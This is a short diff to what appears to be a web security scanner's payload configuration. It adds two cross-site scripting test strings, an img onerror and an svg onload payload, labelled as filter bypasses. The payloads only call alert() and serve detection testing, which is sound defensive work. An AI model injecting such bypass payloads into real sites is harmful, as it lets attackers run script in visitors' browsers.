@@ -87,6 +87,14 @@
         [
             "{c}",
             "reflection-check"
+        ],
+        [
+            "<><img src=1 onerror=alert(\"{c}\")>",
+            "stored-dom-angle-bypass"
+        ],
+        [
+            "<><svg onload=alert(\"{c}\")>",
+            "stored-dom-svg-bypass"
         ]
     ],
     "HREF_BYPASS_PAYLOADS": [
